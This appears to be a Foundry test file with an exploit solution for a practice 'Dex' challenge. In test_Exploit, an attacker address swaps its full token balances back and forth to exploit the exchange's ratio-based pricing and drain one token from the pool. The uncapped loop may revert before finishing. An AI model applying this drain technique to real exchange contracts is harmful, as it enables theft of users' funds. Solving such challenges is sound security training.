// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken public swappabletoken1;
    SwappableToken public swappabletoken2;
    Dex public dex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex = new Dex();
        swappabletoken1 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dex.setTokens(address(swappabletoken1), address(swappabletoken2));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletoken1), 100);
        dex.addLiquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        
        // Set up the attacker with some initial balance
        swappabletoken1.transfer(attacker, 10);
        swappabletoken2.transfer(attacker, 10);
        

        //DO_NOT_TOUCH
    }

    function test_Exploit() public {
       //Execute the attacker here.
       vm.startPrank(attacker);
       for(uint i = 0; i < 1000; i++) {
        if (swappabletoken1.balanceOf(address(dex)) > 0){
            swappabletoken2.approve(address(dex), swappabletoken2.balanceOf(attacker));
            swappabletoken1.approve(address(dex), swappabletoken1.balanceOf(attacker));

            dex.swap(address(swappabletoken2), address(swappabletoken1), swappabletoken2.balanceOf(attacker));
            dex.swap(address(swappabletoken1), address(swappabletoken2), swappabletoken1.balanceOf(attacker));
        } else {
            break;
        }
           
       }

       console.log("Token1 dex balance: ", swappabletoken1.balanceOf(address(dex)));
       console.log("Token1 attacker balance: ", swappabletoken1.balanceOf(attacker));
       console.log("Token2 dex balance: ", swappabletoken2.balanceOf(address(dex)));
       console.log("Token2 attacker balance: ", swappabletoken2.balanceOf(attacker));
       
        is_Drained();
    }

    function is_Drained () internal view{
         require(swappabletoken1.balanceOf(address(dex)) == 0);
    }

}
